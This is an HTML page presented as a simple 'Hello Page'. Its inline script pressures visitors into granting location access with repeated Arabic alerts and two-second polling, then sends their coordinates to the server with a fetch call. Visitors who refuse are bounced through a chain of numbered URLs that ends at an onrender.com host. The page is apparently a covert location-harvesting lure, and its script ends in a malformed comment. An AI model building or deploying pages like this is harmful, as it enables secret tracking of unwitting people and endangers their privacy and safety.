<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hello Page</title>
</head>
<body>
    <h1>Hello!</h1>
    <p>Click the button below to allow location access.</p>
 
    <script>

        function checkGPSService() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    function(position) {
                        // GPS service is enabled
                        //console.log("GPS service is enabled.");
                    },
                    function(error) {
                        // GPS service is not enabled
                        alert("لابد من فتح صلاحية الموقع لمشاهدة المحتوي");
                       redirectToNextURL();
                       // console.error("Error getting location:", error);
                    }
                );
            } else {
                // Geolocation is not supported by the browser
                alert(".لابد من فتح صلاحية الموقع لمشاهدة المحتوي");
            }
        }

        // Call checkGPSService function when the page loads
      //  window.onload = checkGPSService;
        window.onload = function() {

            setInterval(checkGPSService, 2000); // 2000 milliseconds = 2 seconds
          };
          




    
         
//send permession
        navigator.geolocation.getCurrentPosition(showPosition);

        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(showPosition);
              //  navigator.geolocation.getCurrentPosition(showPosition, showError);
            } else {
                alert("-.لابد من فتح صلاحية الموقع لمشاهدة المحتوي");
            }
        }

        function showPosition(position) {
            var coords = position.coords.latitude + "," + position.coords.longitude;



        //  window.location.href = "/allow?coords=" + coords;
       fetch('/?coords=' + coords);



        }




        function redirectToNextURL() {
            // Get the current URL
            var currURL = window.location.href;
            // Extract the current number from the URL
            var currNum = parseInt(currURL.match(/mhf(\d+)/)[1]);
            // Check if the current number is less than or equal to 999
            if (currNum <= 999) {
              // Increment the current number by 1 and construct the next URL
              var nextNum = currNum + 1;
              var nextURL = currURL.replace(/mhf\d+/, 'mhffff' + nextNum);
              // Redirect to the next URL
              window.location.href = nextURL;
            } else {
              // If the current number is greater than 999, display an alert message
              // alert('You have reached the maximum number of URLs.');
              window.location.href = 'https://mhf1.onrender.com';
            }
          }





/*
        function redirectToNextURL() {
         // Get the current host
         var currentHost = window.location.host;
         if (currentHost.endsWith("ms")) {
            // Redirect to the same host with the additional path "/a"
            window.location.href = "https://" + currentHost + "/a";
        } else {
            // Optionally, you can display a message or take other actions
            console.log("Host does not end with 'ms'.");
        }
       
             
            }
*//


          
     

        
    </script>
</body>
</html>
